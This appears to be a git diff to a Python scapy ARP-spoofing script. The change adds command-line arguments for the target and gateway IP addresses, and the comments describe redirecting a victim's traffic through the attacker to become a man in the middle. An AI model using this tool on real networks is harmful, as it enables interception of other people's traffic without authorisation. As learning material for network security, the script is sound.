@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 import time
+import argparse
 
 # For doing ARP spoof in order to become the man in the middle we have to exploit 
 # the ARP protocol and redirect the flow packets so that it flows through our computer.
@@ -38,6 +39,19 @@ import time
 # echo 1 > /proc/sys/net/ipv4/ip_forward
 
 
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t","--target",dest="target",help="Target IP Address")
+    parser.add_argument("-g","--gateway",dest="gateway",help="Gateway IP Address\nExample: python3 arp_spoofer.py -t 10.0.1.7 -g 10.0.1.1")
+    options = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify a target's IP address, use --help for more info.")
+    elif not options.gateway:
+        parser.error("[-] Please specify a gateway IP address, use --help for more info.")
+    return options
+
+
+
 # This function is used to get the mac address of of a device using the ip address of that device
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -68,8 +82,9 @@ def restore(destination_ip,source_ip):
 
 
 sending_packets_count = 0
-target_ip="target_ip"
-gateway_ip="router_ip"
+options = get_arguments()
+target_ip=options.target
+gateway_ip=options.gateway
 
 try:
     while True: # We need to run a loop to make router & victim fool till we want
